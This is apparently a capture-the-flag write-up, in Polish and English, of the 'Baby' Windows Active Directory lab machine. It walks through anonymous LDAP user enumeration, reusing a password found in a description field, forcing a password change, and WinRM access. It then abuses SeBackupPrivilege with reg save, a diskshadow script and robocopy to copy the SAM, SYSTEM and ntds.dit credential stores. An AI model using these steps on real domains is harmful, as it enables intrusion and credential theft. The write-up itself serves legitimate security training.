# Baby
Windows, Easy, created by **xct**

![baby_slide](https://github.com/user-attachments/assets/082cfa7b-36ab-418a-afe6-a5b75320d366)


```
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-26 08:44:24Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
ssl-cert: Subject: commonName=BabyDC.baby.vl
...
5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
53239/tcp open  msrpc         Microsoft Windows RPC
53253/tcp open  msrpc         Microsoft Windows RPC
```

```
echo "10.10.89.70 BabyDC.baby.vl baby.vl" >> /etc/hosts
```

```
dig @10.10.89.70 baby.vl
dig @10.10.89.70 baby.vl any
dig @10.10.89.70 baby.vl axrf
```
- nic ciekawego


No null, no guest session via smb.

![{9F23BCB3-F7E6-4E41-AB9D-89C8852F8CE5}](https://github.com/user-attachments/assets/462aab06-e337-41c8-bef9-5442b8cb96d6)

Ogólnie nic nie ma to sprawdzę czy do ldapa można bez usera się dostać
```
ldapsearch -x -H ldap://10.10.89.70 -D '' -w '' -b "DC=baby,DC=vl"
```

![{BFD17E9E-A268-480B-B644-237436A4ADED}](https://github.com/user-attachments/assets/f455cfe1-9fd5-4e58-a372-ad8eba159bf0)

we see something there


```
ldapsearch -x -H ldap://10.10.89.70 -D '' -w '' -b "DC=baby,DC=vl" | grep sAMAccountName | cut -d' ' -f2
```

![{5FB611B1-D9D0-44D6-87E5-1B4EAD672E02}](https://github.com/user-attachments/assets/6c3a0a6e-a8ee-407f-92e8-bf8aa7345e1a)

Jak mamy listę userów to polecimy klasykiem.

![{4B4219DC-CBF2-4D94-8C4E-6DD2D24D9528}](https://github.com/user-attachments/assets/ba5ceec1-6a9b-4a7a-8105-78333d2686ed)

ASREPRoasting fail

![{EE5192F3-15B6-4C90-8FB3-05013550A93B}](https://github.com/user-attachments/assets/89843b46-55ac-4089-a7e4-5ebf01257811)

ech it was description

![{E58F30D7-4653-4272-94AF-19DB59B6ACAF}](https://github.com/user-attachments/assets/17edc28d-8a60-4136-9e1a-bb0a16d795f0)

Albo nie :O
Co oni wymyślili?!

I checked the list of users again and it turns out that there are users who do not have paramter sAMAccountName

![{6E9C9A56-AE8A-465F-A998-2008C70D9C73}](https://github.com/user-attachments/assets/654b0a80-660e-4633-903f-c19abc68c670)
![{BE2C2424-F88C-45A1-9EE8-730B2696E653}](https://github.com/user-attachments/assets/9cfa8d34-50fd-4e72-935c-28cfae165bef)

```
ldapsearch -x -H ldap://10.10.89.70 -D '' -w '' -b "DC=baby,DC=vl" | grep dn: | cut -d'=' -f2 | cut -d, -f1 | tr ' ' '.'
```
![{F3ABCCCD-8A06-4A52-8287-252A5BFB24B2}](https://github.com/user-attachments/assets/50da1e5a-ce89-4482-9e62-fd26ee516d1c)

![{39E466E0-B148-4784-9A05-0BFFC184830F}](https://github.com/user-attachments/assets/8a06d765-a5f2-4217-95bf-49302578dfe8)

STATUS_PASSWORD_MUST_CHANGE
```
smbpasswd -U Caroline.Robinson -r 10.10.89.70
```

![{E2A3A909-2A2F-455D-B940-35C46126032A}](https://github.com/user-attachments/assets/c9e57702-fd9b-42e3-a799-7aa52e35a1c3)

![{1DAD1931-193A-4363-914B-3DC3C56B597B}](https://github.com/user-attachments/assets/1189e939-9095-4286-b3db-b3db1e3437f0)
read/Write C$? Interesting xD

o wjazd po winrm

![{49FC9E8A-FB91-446B-AA50-B71AA45F2A35}](https://github.com/user-attachments/assets/67067135-d617-4db5-bb62-e2a924bcbd3f)

![{98B0AEE6-3A4B-40B0-BF95-E7C29E5E3E7B}](https://github.com/user-attachments/assets/ed00d99e-ed9c-4376-8f64-63036568f75f)

![{3CA90E08-6F58-43E0-9B58-85B9BC1317E6}](https://github.com/user-attachments/assets/b7e09166-4eb4-48ab-8164-3e7b416d53a8)

```
Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

```
cd c:\
mkdir Temp
reg save hklm\sam c:\Temp\sam
reg save hklm\system c:\Temp\system
download sam
download system
```

![{E1B9D64E-02B8-4902-AD56-84AA9054126F}](https://github.com/user-attachments/assets/c4e4d3be-76e7-44b2-91d4-0edd4c6f6574)

hmmm

![{C332498A-7A16-40BA-9179-3A86B4C80C66}](https://github.com/user-attachments/assets/81d1a786-8cc3-4208-bec6-fc4af8e26134)

Let's try another way

```
nano raj.dsh

set context persistent nowriters
add volume c: alias raj
create
expose %raj% z:
unix2dos raj.dsh
```

![{1CA6321B-24AB-40D6-BBBA-BF8B19B9238F}](https://github.com/user-attachments/assets/aa71d022-71d8-4dc6-9630-c2055813f850)

```
cd C:\Temp
upload raj.dsh
diskshadow /s raj.dsh
robocopy /b z:\windows\ntds . ntds.dit
```

![{6E007FA0-B16F-4C96-B6F9-AA02B8152875}](https://github.com/user-attachments/assets/48fff03e-1aa4-49bb-99eb-550b759d8ceb)

```
reg save hklm\system c:\Temp\system
cd C:\Temp
download ntds.dit
download system
```

![{3CAA4816-29A3-4B2C-BEFD-262E4BAD2927}](https://github.com/user-attachments/assets/42c7db08-be85-45ee-a8bd-c6ecfefa9f90)

![{AF5CC262-F782-45E5-995D-329998C466AA}](https://github.com/user-attachments/assets/a88d9ee5-e8ba-46f0-829f-4b5c67af8dd9)
